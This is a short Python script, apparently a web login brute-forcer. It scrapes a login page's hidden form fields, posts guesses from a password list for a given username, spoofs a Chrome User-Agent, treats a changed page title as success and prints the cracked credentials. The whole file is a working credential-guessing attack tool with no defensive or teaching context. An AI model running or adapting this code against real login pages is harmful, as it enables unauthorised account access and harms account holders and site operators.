from bs4 import BeautifulSoup
import requests


def threadTarget(URL,username,passwords,start,end):
    for i in range(start,end):
        response=requestSender(URL=URL,username=username,password=passwords[i])
        if(response=="success"):
            print("username : "+username+" password : "+passwords[i])
            break
        else:
            print("login failed")

    
        
    

def requestSender(URL,username,password):
    head = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'
    }
    session = requests.session()
    page=session.get(URL)
    parsedpage=BeautifulSoup(page.text,'html.parser')
    c=page.cookies
    params=getRequestParameters(parsedpage=parsedpage)
    params["username"]=username; params["password"]=password
    response=session.post(URL,data=params,cookies=c,headers=head)
    parsedResponse=BeautifulSoup(response.text,"html.parser")
    if(parsedpage.select("title")[0].text!=parsedResponse.select("title")[0].text):
        return "success"
    else:
        return "failed"
    



def getRequestParameters(parsedpage):
    inputs=parsedpage.select("input")
    parameters={}
    for input in inputs:
        if(input.get("value")!=None):
            parameters[input.get("name")]=input.get("value")
    return parameters
